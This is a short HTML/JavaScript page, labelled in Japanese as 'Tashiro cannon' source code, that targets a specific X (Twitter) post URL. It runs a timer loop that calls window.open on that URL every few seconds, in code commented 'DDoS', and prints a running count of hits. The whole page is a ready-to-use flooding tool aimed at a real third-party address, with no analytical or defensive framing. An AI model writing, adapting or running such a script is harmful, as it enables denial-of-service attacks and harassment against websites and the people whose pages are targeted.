<!--■■■初期値■■■-->
<script>
var attackURL='https://x.com/mai_ra67/status/1792571741975216266';
var interval=3000;//1秒=1000
</script>

<!--▼▼▼田代砲ソースコード▼▼▼-->
<!--初期画面-->
<script>
var txt ='<tt>'
        +'<br>AttackURL：'+attackURL
        +'<br>AttackInt：'+(interval/1000)+'秒'
        +'</tt>'
        ;
document.write(txt);
</script>

<!--処理-->
<script>
var i=0;
function zp(i){if(i<1000){return ('00'+i).slice(-3);}else{return i;}}
function tt(att){return '<tt style="font-size:xx-small;'+att+'">';}
  
window.setInterval(function(){
  //初期画面の転写
  if(i==0){document.write(txt+'<br>');}
  
  //DDoS
  window.open(attackURL,null,'top=0,left=0,width=100,height=100');
  
  //ループ回数表示
  i++;
  if(i%100==1){document.write(tt("color:red;")+(i-1)+'</tt><br>');}
  document.write(tt()+zp(i)+' '+'</tt>');
  if(i%25==0){document.write('<br>');}  
  scrollTo(0,i*10);
}, interval);
</script>
<!--▲▲▲田代砲ソースコード▲▲▲-->
